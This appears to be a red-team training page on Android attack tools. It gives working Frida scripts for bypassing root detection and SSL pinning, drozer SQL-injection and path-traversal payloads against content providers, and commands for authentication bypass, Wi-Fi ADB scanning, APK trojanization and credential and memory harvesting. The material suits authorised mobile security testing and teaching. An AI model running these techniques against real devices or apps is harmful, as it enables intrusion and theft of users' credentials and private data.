---
layout: training-page
title: "Android Red Team Tools — Red Team Academy"
module: "Red Team Tools"
tags:
  - android
  - mobile
  - frida
  - objection
  - drozer
  - apktool
  - jadx
  - mobsf
page_key: "tools-android"
render_with_liquid: false
---

# Android Red Team Tools

The modern Android red team arsenal for engagements targeting Android 10–14 (API 30+) devices.
    Covers dynamic instrumentation, component exploitation, APK analysis, traffic interception,
    and automated vulnerability discovery. For deep-dive walkthroughs, see the
    [Mobile Security](/mobile/overview) module.

## // Android 10+ Attack Surface Notes

Modern Android introduces significant security controls that shape the attack path:

| Version | API | Key Restriction | Impact on Red Team |
| --- | --- | --- | --- |
| Android 10 | 29 | Scoped storage enforced | Can't access /sdcard arbitrary paths without MANAGE_EXTERNAL_STORAGE |
| Android 11 | 30 | Package visibility restrictions | pm list packages hidden by default — requires QUERY_ALL_PACKAGES |
| Android 12 | 31 | Intent-filter components default exported=false | Exported component attack surface reduced |
| Android 13 | 33 | Per-notification permissions, media permissions split | Harvesting contacts/media needs separate permissions |
| Android 14 | 34 | Restricted Settings — blocks APK installs with accessibility perms | Social engineering payload delivery harder |
| Android 14 | 34 | Play Integrity API replaces SafetyNet | Root detection more robust — Frida/Magisk may trigger |

```
# Check Android version and security patch level
adb shell getprop ro.build.version.release
adb shell getprop ro.build.version.sdk
adb shell getprop ro.build.version.security_patch

# Check if device is rooted (indicators)
adb shell which su 2>/dev/null
adb shell ls /system/xbin/su 2>/dev/null
adb shell ls /data/local/tmp/ 2>/dev/null

# Check SELinux mode
adb shell getenforce
# "Enforcing" is standard — "Permissive" means rooted/modified kernel
```

 ADB 

## // ADB — Android Debug Bridge

The foundational tool for any Android engagement. Provides shell access over USB or Wi-Fi
    when USB debugging is enabled. Physical access to an unlocked device + enabled USB debugging
    is an instant shell. Wi-Fi ADB (enabled in developer options) is exploitable over local network.

### Install

```
# Kali / Debian
sudo apt install adb

# macOS
brew install android-platform-tools

# Windows — download SDK Platform-Tools from Google
# https://developer.android.com/tools/releases/platform-tools
```

### USB Debugging Attack Vector

```
# Physical access: connect device, authorize debugging
adb devices

# Check for Wi-Fi ADB (default port 5555)
nmap -p 5555 192.168.1.0/24
adb connect 192.168.1.50:5555
adb shell

# Android 11+ supports wireless ADB via QR code pairing (port 37080-38000 range)
# If developer options enabled, pair over Wi-Fi:
adb pair 192.168.1.50:39485

# List all connected devices
adb devices -l
```

### APK Extraction

```
# List all installed packages
adb shell pm list packages -3          # third-party only
adb shell pm list packages -f -3       # with APK paths
adb shell pm list packages -f | grep target

# Extract APK from device
adb shell pm path com.target.app
# Output: package:/data/app/com.target.app-1/base.apk
adb pull /data/app/com.target.app-1/base.apk ./target.apk

# Extract split APKs (common in modern apps)
adb shell pm path com.target.app
# May show multiple paths: base.apk, split_config.arm64_v8a.apk, etc.
for apk in $(adb shell pm path com.target.app | cut -d: -f2); do
    adb pull $apk
done
```

### ADB Backup Abuse (API < 31, or debug builds)

```
# Create full device backup (triggers consent dialog on screen)
adb backup -apk -shared -all -f backup.ab

# Backup specific app (including private data if app allows)
adb backup -apk -f com.target.app.ab com.target.app

# Convert backup to tar for inspection
java -jar abe.jar unpack com.target.app.ab com.target.app.tar
tar xf com.target.app.tar

# Private app data is at: apps/com.target.app/
# SharedPreferences, databases, cache all accessible
```

### Logcat — Sensitive Data in Logs

```
# Real-time log of all processes
adb logcat

# Filter to target app only
adb logcat --pid=$(adb shell pidof com.target.app)

# Grep for sensitive patterns
adb logcat | grep -iE "token|password|secret|api_key|bearer|auth|credit|cvv|ssn"

# Log buffer dump (last N lines)
adb logcat -d | grep com.target.app | tail -500

# Search crash logs for stack traces leaking internal structure
adb logcat -d *:E | grep -i "exception\|error\|crash"
```

### Shell Access — Device Recon

```
# Interactive shell
adb shell

# Run single commands
adb shell getprop                           # all system properties
adb shell settings get secure android_id   # unique device ID
adb shell dumpsys account                  # linked Google/Exchange accounts
adb shell dumpsys telephony.registry       # carrier info

# Running apps
adb shell dumpsys activity activities | grep "mResumedActivity"

# Installed packages with permissions
adb shell dumpsys package com.target.app | grep -E "permission|uses-permission"

# Writable world-readable directories
adb shell ls -la /sdcard/
adb shell ls -la /data/local/tmp/

# Network state
adb shell netstat -tlnp
adb shell cat /proc/net/arp
```

 FRIDA 

## // Frida — Dynamic Instrumentation

Runtime code injection and hooking engine. Used to bypass SSL pinning, root detection,
    biometric checks, and any runtime security control. Requires frida-server on the device
    (matching exact version to frida-tools on your host).

> Deep dive: [Frida Dynamic Instrumentation](/mobile/frida)

### Install

```
# Host
pip install frida-tools

# Get current version
frida --version
# e.g., 16.3.3

# Device — download frida-server matching your frida-tools version
# github.com/frida/frida/releases
# Modern physical devices: android-arm64
# Emulators: android-x86_64

VERSION=$(frida --version)
ARCH=arm64                                 # or x86_64 for emulator
wget "https://github.com/frida/frida/releases/download/${VERSION}/frida-server-${VERSION}-android-${ARCH}.xz"
xz -d frida-server-*.xz

adb push frida-server /data/local/tmp/frida-server
adb shell chmod 755 /data/local/tmp/frida-server

# Start frida-server (rooted device)
adb shell su -c "/data/local/tmp/frida-server &"

# Verify
frida-ps -U
frida-ps -Uai     # running apps only
```

### Root Detection Bypass

```javascript
// rootbypass.js — hooks common root detection methods
Java.perform(() => {
    // Hook RootBeer / common root check library
    const RootBeer = Java.use("com.scottyab.rootbeer.RootBeer");
    RootBeer.isRooted.overload().implementation = function() {
        console.log("[*] RootBeer.isRooted() -> false");
        return false;
    };

    // Hook Runtime.exec — block su calls
    const Runtime = Java.use("java.lang.Runtime");
    Runtime.exec.overload("java.lang.String").implementation = function(cmd) {
        if (cmd.indexOf("su") !== -1 || cmd.indexOf("which") !== -1) {
            console.log("[*] Blocked exec: " + cmd);
            throw Java.use("java.io.IOException").$new("Permission denied");
        }
        return this.exec(cmd);
    };

    // Hook file existence checks for /system/xbin/su etc.
    const File = Java.use("java.io.File");
    File.exists.implementation = function() {
        const path = this.getAbsolutePath();
        if (path.includes("su") || path.includes("magisk") || path.includes("superuser")) {
            console.log("[*] File.exists() false for: " + path);
            return false;
        }
        return this.exists();
    };
});
```

```
# Run script against target
frida -U -f com.target.app -l rootbypass.js --no-pause
```

### SSL Certificate Pinning Bypass

```javascript
// sslbypass.js — universal pinning bypass for OkHttp3, TrustManager, Conscrypt
Java.perform(() => {
    // OkHttp3 CertificatePinner
    try {
        const CertificatePinner = Java.use("okhttp3.CertificatePinner");
        CertificatePinner.check.overload("java.lang.String", "java.util.List").implementation = function(host, certs) {
            console.log("[*] OkHttp3 CertificatePinner bypassed for: " + host);
        };
    } catch(e) {}

    // TrustManagerImpl
    try {
        const TrustManagerImpl = Java.use("com.android.org.conscrypt.TrustManagerImpl");
        TrustManagerImpl.verifyChain.implementation = function(untrusted, trustAnchorChain, host, clientAuth, ocspData, tlsSctData) {
            console.log("[*] TrustManagerImpl.verifyChain bypassed for: " + host);
            return untrusted;
        };
    } catch(e) {}

    // X509TrustManager
    const X509TrustManager = Java.use("javax.net.ssl.X509TrustManager");
    const SSLContext = Java.use("javax.net.ssl.SSLContext");
    const TrustManager = Java.registerClass({
        name: "com.bypass.TrustManager",
        implements: [X509TrustManager],
        methods: {
            checkClientTrusted(chain, authType) {},
            checkServerTrusted(chain, authType) {},
            getAcceptedIssuers() { return []; }
        }
    });
    const ctx = SSLContext.getInstance("TLS");
    ctx.init(null, [TrustManager.$new()], null);
    SSLContext.getDefault.implementation = () => ctx;
});
```

```
frida -U -f com.target.app -l sslbypass.js --no-pause
```

 OBJECTION 

## // Objection — Frida Automation

Runtime mobile exploration toolkit that automates common Frida tasks via a CLI REPL.
    No JavaScript required for common bypasses — SSL pinning, root detection, file system
    exploration, and memory dumps are all single commands.

> Deep dive: [Objection Framework](/mobile/objection)

### Install

```
pip3 install objection
objection version
```

### Core Workflow

```
# Attach to running app
objection -g com.target.app explore

# Spawn fresh with SSL pinning disabled on startup
objection -g com.target.app explore \
    --startup-command "android sslpinning disable"
```

### Essential Commands

```
# SSL Pinning
android sslpinning disable                          # bypass all detected pinning
android sslpinning disable --quiet false            # verbose — shows what it hooks

# Root Detection
android root disable                                # bypass root detection checks
android root simulate                               # simulate non-rooted environment

# File System
file ls                                             # list current directory
file cd /data/data/com.target.app/
file ls
file cat /data/data/com.target.app/shared_prefs/credentials.xml
file download /data/data/com.target.app/databases/app.db ./app.db

# SharedPreferences (all app prefs — often contains tokens)
android shared_preferences list

# KeyStore entries
android keystore list

# Clipboard
android clipboard monitor                           # monitor clipboard in real-time

# Biometric bypass
android ui biometric_bypass enable

# Heap dump
memory dump all ./heap.dump
memory search --string "password"
memory search --string "Bearer "

# Class enumeration
android hooking list classes | grep -i target
android hooking list class_methods com.target.app.auth.AuthManager
android hooking watch class_method com.target.app.auth.AuthManager.login --dump-args --dump-return
```

 DROZER 

## // drozer — Android Component Attack Framework

Drozer (WithSecureLabs Python 3 fork) enumerates and attacks exported Android components
    from a host machine via a device-side agent APK. No root required.

> Deep dive: [Android Exploitation](/mobile/android-exploitation)

### Install (Python 3 fork)

```
# Use the maintained Python 3 fork
pip install drozer

# Or from source
git clone https://github.com/WithSecureLabs/drozer
cd drozer && pip install .

# Install agent APK on device
adb install drozer-agent.apk
# APK available at: github.com/WithSecureLabs/drozer-agent/releases

# Start drozer server on device
# Open drozer-agent app → start server (default port 31415)

# Connect from host
adb forward tcp:31415 tcp:31415
drozer console connect
```

### Attack Surface Enumeration

```
# Attack surface summary (exported components count)
run app.package.attacksurface com.target.app

# List exported Activities
run app.activity.info -a com.target.app

# List exported Services
run app.service.info -a com.target.app

# List exported Broadcast Receivers
run app.broadcast.info -a com.target.app

# List exported Content Providers
run app.provider.info -a com.target.app

# Find all accessible URIs for a content provider
run app.provider.finduri com.target.app

# Check for accessible Content Providers across all apps
run scanner.provider.finduris -a com.target.app
```

### Exported Component Exploitation

```
# Launch exported Activity (bypass authentication)
run app.activity.start --component com.target.app com.target.app.AdminActivity

# Launch with intent extras
run app.activity.start \
    --component com.target.app com.target.app.DeepLinkActivity \
    --extra string url "file:///data/data/com.target.app/shared_prefs/secrets.xml"

# Query Content Provider (SQL injection test)
run app.provider.query content://com.target.app.provider/users
run app.provider.query content://com.target.app.provider/users \
    --selection "1=1--"

# Content Provider SQL injection
run app.provider.query content://com.target.app.provider/users \
    --projection "* FROM sqlite_master--"

# Content Provider path traversal
run app.provider.read content://com.target.app.files/../../../data/data/com.target.app/databases/main.db

# Scan for SQL injection across all providers
run scanner.provider.injection -a com.target.app

# Scan for path traversal
run scanner.provider.traversal -a com.target.app

# Send broadcast to exported receiver
run app.broadcast.send \
    --component com.target.app com.target.app.BootReceiver \
    --action android.intent.action.BOOT_COMPLETED
```

 APKTOOL 

## // apktool — APK Decompile / Repackage

Decodes APKs to Smali bytecode + readable XML resources. Used to inspect manifests,
    patch security controls in Smali, and repackage signed APKs for delivery.

> Deep dive: [APK Static Analysis](/mobile/apk-analysis)

### Install

```
# Kali
sudo apt install apktool

# Manual (latest version)
wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool
wget https://github.com/iBotPeaches/Apktool/releases/latest/download/apktool.jar
chmod +x apktool apktool.jar
sudo mv apktool apktool.jar /usr/local/bin/
```

### Core Workflow

```
# Decompile APK
apktool d target.apk -o target_decoded/

# Key files after decoding:
# target_decoded/AndroidManifest.xml   — readable manifest
# target_decoded/res/values/strings.xml — may contain API keys
# target_decoded/smali/                — Dalvik assembly
# target_decoded/assets/               — raw assets

# Search for secrets in resources
grep -r "api_key\|secret\|password\|token\|key\|firebase" target_decoded/res/
grep -r "http\|https" target_decoded/res/values/strings.xml

# Patch network_security_config.xml to trust user certs (Burp CA)
# target_decoded/res/xml/network_security_config.xml
```

### Patch & Repackage (Trust User CA for Burp)

```
# Step 1: Decode
apktool d target.apk -o target_decoded/

# Step 2: Edit network_security_config.xml
# If it doesn't exist, create res/xml/network_security_config.xml:
cat > target_decoded/res/xml/network_security_config.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <base-config cleartextTrafficPermitted="true">
        <trust-anchors>
            <certificates src="system"/>
            <certificates src="user"/>
        </trust-anchors>
    </base-config>
</network-security-config>
EOF

# Step 3: Add reference to AndroidManifest.xml (if not present)
# In <application> tag add: android:networkSecurityConfig="@xml/network_security_config"

# Step 4: Rebuild
apktool b target_decoded/ -o target_patched.apk

# Step 5: Sign with debug keystore
keytool -genkey -v -keystore debug.keystore -storepass android \
    -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 \
    -validity 10000 -dname "CN=Android Debug,O=Android,C=US"

# Java 8 apksigner
java -jar apksigner.jar sign --ks debug.keystore --ks-pass pass:android \
    --key-pass pass:android target_patched.apk

# Or with zipalign + apksigner (Kali path)
zipalign -v 4 target_patched.apk target_final.apk
apksigner sign --ks ~/.android/debug.keystore target_final.apk

# Step 6: Install
adb install target_final.apk
```

 JADX 

## // jadx — Java Decompiler

Converts Dalvik bytecode (DEX) to readable Java source. Faster and more readable than
    Smali. Essential for code review, logic analysis, and finding hardcoded secrets.

> Deep dive: [APK Static Analysis](/mobile/apk-analysis)

### Install

```
# Kali
sudo apt install jadx

# Latest release (recommended — includes jadx-gui)
wget https://github.com/skylot/jadx/releases/latest/download/jadx-1.x.x.zip
unzip jadx-*.zip -d jadx/
```

### Core Usage

```
# Decompile to Java source
jadx -d output_dir/ target.apk

# Output structure:
# output_dir/sources/com/target/app/...  — Java source
# output_dir/resources/                  — decoded resources

# GUI (interactive code browser)
jadx-gui target.apk

# Decompile single DEX
jadx classes.dex -d output_dir/

# High-confidence decompile flags
jadx -d output/ --no-res --show-bad-code target.apk

# Decompile with debug info
jadx -d output/ --deobf target.apk
```

### Secret Hunting

```
# After decompiling, search source for secrets
grep -rn "api_key\|apiKey\|API_KEY" output_dir/sources/
grep -rn "secret\|SECRET" output_dir/sources/
grep -rn "password\|PASSWORD" output_dir/sources/
grep -rn "Bearer\|token\|TOKEN" output_dir/sources/
grep -rn "firebase\|firebaseio\|amazonaws\|blob.core" output_dir/sources/
grep -rn "private.*key\|-----BEGIN" output_dir/sources/

# Find all hardcoded URL endpoints
grep -rn "http[s]\?://" output_dir/sources/ | grep -v ".gradle\|test\|Test" | sort -u

# Regex for API keys (common patterns)
grep -rnE "(AIza[0-9A-Za-z-_]{35}|AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140})" output_dir/

# AWS keys
grep -rnE "AKIA[0-9A-Z]{16}" output_dir/
```

 MOBSF 

## // MobSF — Mobile Security Framework

Automated static and dynamic analysis platform. Analyzes APKs without manual decompiling —
    produces a scored report covering secrets, permissions, security misconfigs, and dynamic
    behavior via an emulated device or connected physical device.

### Install (Docker — Recommended)

```
# Pull and run
docker pull opensecurity/mobile-security-framework-mobsf:latest
docker run -it --rm \
    -p 8000:8000 \
    opensecurity/mobile-security-framework-mobsf:latest

# Access UI at http://localhost:8000
# Default credentials: mobsf / mobsf

# With persistent data
docker run -it --rm \
    -p 8000:8000 \
    -v /opt/mobsf:/home/mobsf/.MobSF \
    opensecurity/mobile-security-framework-mobsf:latest
```

### REST API (Automation)

```
# Upload APK for analysis
curl -F "file=@target.apk" \
     -H "Authorization: $(curl -s http://localhost:8000/api/v1/api_docs | python3 -c 'import sys,json; print(json.load(sys.stdin)["api_key"])')" \
     http://localhost:8000/api/v1/upload

# Or use the Python client
pip install mobsf

# One-shot analysis script
python3 << 'EOF'
import requests, json

API_URL = "http://localhost:8000"
API_KEY = "your_api_key"  # from MobSF settings
headers = {"Authorization": API_KEY}

# Upload
with open("target.apk", "rb") as f:
    resp = requests.post(f"{API_URL}/api/v1/upload", files={"file": f}, headers=headers)
    scan_hash = resp.json()["hash"]

# Scan
requests.post(f"{API_URL}/api/v1/scan", data={"scan_type": "apk", "hash": scan_hash}, headers=headers)

# Get JSON report
report = requests.post(f"{API_URL}/api/v1/report_json", data={"hash": scan_hash}, headers=headers).json()
print(json.dumps(report.get("secrets", []), indent=2))
print(json.dumps(report.get("exported_activities", []), indent=2))
EOF
```

 APKLEAKS 

## // APKLeaks — Secret Discovery

Scans APK files for leaked API keys, tokens, credentials, and sensitive endpoints
    using regex patterns. Fast, zero-configuration secret scanner for APK triage.

### Install

```
pip3 install apkleaks
# or
git clone https://github.com/dwisiswant0/apkleaks
pip3 install -r requirements.txt
```

### Usage

```
# Basic scan
apkleaks -f target.apk

# JSON output
apkleaks -f target.apk -o results.json -p json

# Verbose (show all matches including low-confidence)
apkleaks -f target.apk --verbose

# Custom pattern file (extend built-ins)
apkleaks -f target.apk --pattern custom_patterns.json

# Scan extracted directory (after apktool decode)
# APKLeaks can also scan decoded smali/source dirs
apkleaks -f target.apk -o leaks.txt
```

```json
// custom_patterns.json — add company-specific patterns
{
    "InternalEndpoint": "internal\\.company\\.com",
    "JWTSecret": "HS256|HS512|RS256",
    "SlackWebhook": "hooks\\.slack\\.com/services/[A-Z0-9]+/[A-Z0-9]+/[a-zA-Z0-9]+"
}
```

 APKID 

## // APKiD — Packer / Obfuscation Detection

Identifies APK packers, obfuscators, anti-tamper, and anti-debug mechanisms before
    investing time in analysis. Tells you what tools were used to build and protect the app.

### Install

```
pip install apkid
```

### Usage

```
# Identify protections
apkid target.apk

# JSON output for automation
apkid --json target.apk

# Scan multiple APKs
apkid *.apk

# Recursive scan on extracted directories
apkid -r extracted_dir/

# Sample output:
# [DETECTED] classes.dex
# compiler : dx
# obfuscator : ProGuard
# anti_vm : checks build.prop for emulator
# anti_debug : checks for debugger (android.os.Debug.isDebuggerConnected)
```

```
# If packer detected, use DexDump to extract unpacked DEX at runtime
# frida-dexdump: dump all DEX from memory at runtime
pip install frida-dexdump
frida-dexdump -U -f com.target.app
# Outputs: dex files to ./com.target.app/
```

 REFLUTTER 

## // reFlutter — Flutter App Interception

Patches Flutter engine to disable SSL certificate verification and intercepts traffic
    from Flutter apps. Flutter apps bypass standard proxy settings and system trust stores —
    reFlutter is the dedicated solution.

### Install

```
pip3 install reflutter
```

### Workflow

```
# Step 1: Patch the APK
reflutter target.apk
# Prompts for your Burp listener IP
# Enter your machine's IP (not 127.0.0.1)
# Enter Burp port (default 8080)
# Outputs: release.RE.apk

# Step 2: Sign and install
cd $(python3 -c "import site; print(site.getsitepackages()[0])")/reflutter/
java -jar uber-apk-signer.jar --apks /path/to/release.RE.apk

# Install signed APK
adb install release.RE.apk.aligned.debugSigned.apk

# Step 3: Configure Burp proxy
# Set Burp listener to: 0.0.0.0:8080 (all interfaces)
# Enable "Intercept Client Requests" and "Intercept Server Responses"
# No device proxy settings needed — traffic is redirected at engine level

# Step 4: Run app — Flutter traffic flows through Burp
```

```
# Alternative: use Frida for newer Flutter versions (snapshot_hash mismatch)
# flutter-ssl-bypass.js (community script)
frida -U -f com.target.app \
    -l https://github.com/horangi-cyops/flutter-ssl-pinning-bypass/raw/main/flutter_ssl_pinning_bypass.js \
    --no-pause
```

 BURP 

## // Burp Suite — Android Traffic Interception

Intercepting HTTPS on Android 7+ (API 24+) requires overcoming the user-cert restriction
    — apps no longer trust user-installed certificates by default. Options depend on device
    root access and whether you can repackage the APK.

> Deep dive: [SSL Pinning Bypass](/mobile/ssl-pinning-bypass)

### Android 7+ — Patching the App (No Root)

```
# Method 1: Patch network_security_config.xml via apktool (see apktool section above)
# Best for apps that don't use certificate pinning — fixes the trust anchor issue

# Method 2: Use objection to disable pinning at runtime
# Requires Frida server (see Frida section — needs root or test device)
```

### Rooted Device — Install Burp CA as System Trust

```
# Export Burp CA (DER format) from Burp: Proxy → Options → Import / export CA certificate
# Convert to PEM
openssl x509 -inform DER -in burp.der -out burp.pem

# Get cert hash
HASH=$(openssl x509 -inform PEM -subject_hash_old -in burp.pem | head -1)

# Copy to system store (root required)
cp burp.pem ${HASH}.0
adb push ${HASH}.0 /data/local/tmp/
adb shell su -c "mount -o remount,rw /system"
adb shell su -c "cp /data/local/tmp/${HASH}.0 /system/etc/security/cacerts/"
adb shell su -c "chmod 644 /system/etc/security/cacerts/${HASH}.0"
adb reboot

# Modern root (Magisk module approach):
# Install "MagiskTrustUserCerts" module → all user certs become system certs
# Magisk Manager → Modules → search "trust user certs"
```

### Configure Android Proxy

```
# Set proxy on device (Settings → Wi-Fi → Modify Network → Advanced)
# Host: <your Burp machine IP>  Port: 8080

# Or force via ADB (requires root)
adb shell settings put global http_proxy 192.168.1.5:8080

# Remove proxy
adb shell settings put global http_proxy :0
```

 ANDROGUARD 

## // Androguard — Python APK Analysis

Python library for programmatic APK/DEX analysis. Ideal for scripting bulk analysis,
    extracting components, mapping call graphs, and writing custom scanners.

### Install

```
pip install androguard
```

### Core Usage

```python
from androguard.misc import AnalyzeAPK

# Load APK
app, dex, analysis = AnalyzeAPK("target.apk")

# Manifest info
print("Package:", app.get_package())
print("Min SDK:", app.get_min_sdk_version())
print("Target SDK:", app.get_target_sdk_version())
print("Permissions:", app.get_permissions())

# Exported components (attack surface)
for activity in app.get_activities():
    if app.get_activity_intent_filters(activity):
        print(f"[EXPORTED] Activity: {activity}")

for service in app.get_services():
    if app.get_service_intent_filters(service):
        print(f"[EXPORTED] Service: {service}")

for receiver in app.get_receivers():
    if app.get_receiver_intent_filters(receiver):
        print(f"[EXPORTED] Receiver: {receiver}")

for provider in app.get_providers():
    print(f"Provider: {provider}")

# Find all string constants (secrets hunting)
for cls in dex.get_classes():
    for method in cls.get_methods():
        for ins in method.get_instructions():
            if ins.get_name() == "const-string":
                val = ins.get_output().split(",", 1)[-1].strip().strip("'")
                if len(val) > 10 and any(kw in val.lower() for kw in
                    ["key", "secret", "token", "password", "api", "bearer"]):
                    print(f"[*] {cls.name}.{method.name}: {val}")

# Cross-reference: find all callers of a sensitive method
target = analysis.get_method_analysis_by_name(
    "Lcom/target/app/security/CryptoManager;",
    "encrypt",
    "(Ljava/lang/String;)Ljava/lang/String;"
)
if target:
    for caller in target.get_xref_from():
        print(f"Caller: {caller[1].class_name}.{caller[1].name}")
```

```bash
# CLI — quick analysis
androguard analyze target.apk

# Extract permissions
androguard apkid target.apk

# Decompile to Java (uses jadx under the hood)
androguard decompile -i target.apk -o output/
```

 NUCLEI 

## // Nuclei — Mobile API Templates

Nuclei's mobile templates scan for vulnerabilities in the backend APIs used by Android
    apps. After extracting API endpoints from the APK via jadx/APKLeaks, run Nuclei against
    the discovered base URLs.

### Install

```
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# Update templates (includes mobile-specific templates)
nuclei -update-templates
```

### Mobile API Scanning Workflow

```
# Step 1: Extract API endpoints from decompiled APK
grep -rn "https\?://" jadx_output/sources/ | \
    grep -oE "https?://[a-zA-Z0-9./_-]+" | \
    sort -u > endpoints.txt

# Step 2: Extract base URLs
cat endpoints.txt | grep -oE "https?://[^/]+" | sort -u > base_urls.txt

# Step 3: Scan with mobile-relevant templates
nuclei -l base_urls.txt \
    -t exposures/ \
    -t misconfiguration/ \
    -t vulnerabilities/generic/ \
    -severity medium,high,critical \
    -o nuclei_results.json \
    -jsonl

# Step 4: API-specific templates
nuclei -l base_urls.txt \
    -t http/exposed-panels/ \
    -t http/misconfiguration/unauthenticated-* \
    -t http/vulnerabilities/ \
    -H "Authorization: Bearer <token_from_frida>"

# Step 5: JWT vulnerabilities
nuclei -l base_urls.txt \
    -t http/vulnerabilities/generic/jwt-*

# Use intercepted traffic as input (from Burp saved requests)
nuclei -im burp -iserver http://localhost:8080

# Scan Firebase URLs
echo "https://target-app-default-rtdb.firebaseio.com" | \
    nuclei -t exposures/apis/firebase-*
```

## // Quick Reference — Tool Selection Matrix

| Phase | Task | Go-To Tool | Alternative | OPSEC / Notes |
| --- | --- | --- | --- | --- |
| Recon | APK extraction | ADB pull | Manual adb backup | Low risk if USB debug enabled |
| Recon | Attack surface map | drozer attacksurface | Manifest review + aapt | No root required |
| Recon | Secret scanning | APKLeaks | MobSF static report | Offline — no device needed |
| Recon | Obfuscation check | APKiD | strings + grep patterns | Informs analysis approach |
| Recon | Code review | jadx + grep | MobSF source viewer | jadx faster for targeted search |
| Recon | Bulk analysis | MobSF | Androguard scripts | MobSF covers 90% automatically |
| Intercept | HTTPS (non-Flutter) | Objection sslpinning | apktool NSC patch + Burp | Objection faster; apktool survives restarts |
| Intercept | HTTPS (Flutter) | reFlutter | Frida flutter-ssl script | reFlutter persists across runs |
| Intercept | HTTPS (rooted) | Magisk TrustUserCerts | System CA push via ADB | Persists after reboot |
| Bypass | Root detection | Objection root disable | Frida custom script | Objection handles 90% of common libs |
| Bypass | Biometric | Objection biometric_bypass | Frida BiometricPrompt hook | Android 9+ requires hooking BiometricPrompt |
| Exploit | Exported activities | drozer activity.start | adb am start | drozer handles extras easier |
| Exploit | Content provider | drozer provider.query | adb content query | drozer has built-in SQLi scanner |
| Exploit | APK trojanization | apktool + msfvenom | Injecting backdoor smali | Sign with valid cert for delivery |
| Post | Credential harvest | Objection file dump | ADB pull (root) | SharedPrefs, DB files, KeyStore |
| Post | Memory secrets | Objection memory search | Frida heap dump | Search for Bearer tokens, JWTs |

## // Modern Android Defense Evasion Notes

```
# Play Integrity API (Android 14+) — replaces SafetyNet
# Strong integrity check = hardware attestation (TPM) — cannot be bypassed without custom ROM
# Basic integrity check = software — Magisk + Shamiko module can bypass
# Device integrity = MEETS_BASIC_INTEGRITY — rooted device with DenyList configured

# Frida detection countermeasures
# Some apps detect frida-server via /proc/<pid>/maps or port 27042
# Use custom frida-server on non-default port:
adb shell "/data/local/tmp/frida-server -l 0.0.0.0:27999 &"
frida -H 127.0.0.1:27999 -U -f com.target.app

# Network security config bypass (no-root)
# If app targets API 23 or lower (AndroidManifest minSdkVersion < 24)
# it trusts user certs automatically — no patching needed

# Check if app uses certificate pinning type
# Hash pinning (sha256): must bypass at okhttp/conscrypt level
# Public key pinning: same approach via Frida hook
# Bidirectional (mTLS): need to extract client cert from app

# Extract embedded client certificate (mTLS)
grep -rn "\.p12\|\.bks\|\.jks\|KeyStore\|client_cert" jadx_output/
strings target.apk | grep -E "BEGIN CERTIFICATE|BEGIN RSA"
```
